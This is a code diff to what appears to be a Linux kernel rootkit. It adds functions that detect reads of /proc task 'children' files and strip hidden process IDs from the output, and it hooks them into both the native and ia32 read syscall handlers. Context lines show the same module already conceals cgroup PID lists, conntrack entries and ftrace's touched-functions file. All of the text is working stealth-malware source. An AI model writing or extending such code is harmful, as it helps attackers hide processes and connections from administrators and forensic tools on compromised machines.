@@ -324,6 +324,107 @@ static notrace bool is_touched_functions_file(struct file *file)
             strcmp(sb->s_type->name, "debugfs") == 0);
 }
 
+static notrace bool is_proc_children_file(struct file *file)
+{
+    struct dentry *dentry, *parent;
+    const char *name;
+
+    if (!file || !file->f_path.dentry)
+        return false;
+
+    dentry = file->f_path.dentry;
+    name = dentry->d_name.name;
+    if (!name || strcmp(name, "children") != 0)
+        return false;
+
+    parent = dentry->d_parent;
+    if (!parent || !parent->d_name.name)
+        return false;
+    {
+        const char *p = parent->d_name.name;
+        if (!(*p >= '0' && *p <= '9'))
+            return false;
+    }
+
+    parent = parent->d_parent;
+    if (!parent || !parent->d_name.name)
+        return false;
+    if (strcmp(parent->d_name.name, "task") != 0)
+        return false;
+
+    return true;
+}
+
+static notrace ssize_t filter_proc_children_pids(char __user *user_buf, ssize_t bytes_read)
+{
+    char *kernel_buf, *out_buf;
+    ssize_t out_len = 0;
+    char *p, tok[16];
+    int tok_len, pid;
+
+    if (bytes_read <= 0 || !user_buf)
+        return bytes_read;
+
+    kernel_buf = kmalloc(bytes_read + 1, GFP_ATOMIC);
+    if (!kernel_buf)
+        return bytes_read;
+
+    if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
+        kfree(kernel_buf);
+        return bytes_read;
+    }
+    kernel_buf[bytes_read] = '\0';
+
+    out_buf = kzalloc(bytes_read + 1, GFP_ATOMIC);
+    if (!out_buf) {
+        kfree(kernel_buf);
+        return bytes_read;
+    }
+
+    p = kernel_buf;
+    while (*p) {
+        while (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r')
+            p++;
+        if (*p == '\0')
+            break;
+
+        tok_len = 0;
+        while (*p >= '0' && *p <= '9' && tok_len < (int)sizeof(tok) - 1)
+            tok[tok_len++] = *p++;
+        tok[tok_len] = '\0';
+
+        if (tok_len == 0)
+            break;
+
+        if (kstrtoint(tok, 10, &pid) == 0 &&
+            !is_pid_hidden(pid) && !is_child_pid(pid)) {
+            if (out_len > 0)
+                out_buf[out_len++] = ' ';
+            out_len += snprintf(out_buf + out_len,
+                                bytes_read + 1 - out_len, "%d", pid);
+        }
+    }
+
+    if (out_len > 0 && out_len < bytes_read)
+        out_buf[out_len++] = '\n';
+
+    if (clear_user(user_buf, bytes_read)) {
+        kfree(kernel_buf);
+        kfree(out_buf);
+        return bytes_read;
+    }
+
+    if (out_len > 0 && copy_to_user(user_buf, out_buf, out_len)) {
+        kfree(kernel_buf);
+        kfree(out_buf);
+        return bytes_read;
+    }
+
+    kfree(kernel_buf);
+    kfree(out_buf);
+    return out_len;
+}
+
 static notrace bool is_nf_conntrack_file(struct file *file)
 {
     const char *name;
@@ -905,6 +1006,14 @@ static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
         return filter_cgroup_pids(user_buf, orig_res);
     }
 
+    if (is_proc_children_file(file)) {
+        orig_res = orig_read(regs);
+        fput(file);
+        if (orig_res <= 0)
+            return orig_res;
+        return filter_proc_children_pids(user_buf, orig_res);
+    }
+
     if (is_nf_conntrack_file(file)) {
         orig_res = orig_read(regs);
         fput(file);
@@ -1055,6 +1164,14 @@ static notrace asmlinkage ssize_t hook_read_ia32(const struct pt_regs *regs) {
         if (orig_res <= 0)
             return orig_res;
         return filter_cgroup_pids(user_buf, orig_res);
+    }
+
+    if (is_proc_children_file(file)) {
+        orig_res = orig_read_ia32(regs);
+        fput(file);
+        if (orig_res <= 0)
+            return orig_res;
+        return filter_proc_children_pids(user_buf, orig_res);
     }
 
     if (is_nf_conntrack_file(file)) {
